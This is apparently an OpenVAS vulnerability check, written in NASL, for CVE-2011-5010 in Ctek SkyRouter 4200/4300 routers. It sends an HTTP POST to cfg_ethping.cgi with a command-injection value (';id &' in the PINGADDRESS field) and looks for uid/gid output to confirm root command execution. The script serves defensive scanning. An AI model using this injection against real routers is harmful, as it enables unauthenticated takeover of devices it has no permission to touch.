###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_ctek_skyrouter_50867.nasl 3062 2016-04-14 11:03:39Z benallard $
#
# Ctek SkyRouter 4200 and 4300 Series Routers Remote Arbitrary Command Execution Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "Ctek SkyRouter 4200 and 4300 series routers are prone to a remote
arbitrary command-execution vulnerability because it fails to
adequately sanitize user-supplied input.

Remote attackers can exploit this issue to execute arbitrary shell
commands with superuser privileges, which may facilitate a complete
compromise of the affected device.";


if (description)
{
 script_id(103479);
 script_bugtraq_id(50867);
 script_tag(name:"cvss_base", value:"10.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
 script_version("$Revision: 3062 $");
 script_cve_id("CVE-2011-5010");

 script_name("Ctek SkyRouter 4200 and 4300 Series Routers Remote Arbitrary Command Execution Vulnerability");

 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/50867");
 script_xref(name : "URL" , value : "http://www.ctekproducts.com/");

 script_tag(name:"last_modification", value:"$Date: 2016-04-14 13:03:39 +0200 (Thu, 14 Apr 2016) $");
 script_tag(name:"creation_date", value:"2012-04-25 15:07:13 +0200 (Wed, 25 Apr 2012)");
 script_summary("Determine if it is possible to execute the id command");
 script_category(ACT_ATTACK);
 script_tag(name:"qod_type", value:"remote_vul");
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
   
port = get_http_port(default:80);
if(!get_port_state(port))exit(0);

req = string("GET /apps/a3/cfg_ethping.cgi HTTP/1.1\r\n",
             "Host: ", get_host_name(),"\r\n\r\n");

res = http_send_recv(port:port, data:req);

if("Ctek" >!< res && "SkyRouter" >!< res)exit(0);

req = string("POST /apps/a3/cfg_ethping.cgi HTTP/1.1\r\n",
             "Host: ", get_host_name(),"\r\n",
             "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; OpenVAS 5)\r\n",
             "Content-Type: application/x-www-form-urlencoded\r\n",
             "Content-Length: 63\r\n",
             "\r\n",
             "MYLINK=%2Fapps%2Fa3%2Fcfg_ethping.cgi&CMD=u&PINGADDRESS=;id+%26");

res = http_send_recv(port:port, data:req);

if(egrep(pattern:"uid=[0-9]+.*gid=[0-9]+.*", string:res)) {
  security_message(port:port);
  exit(0);
}  


exit(0);
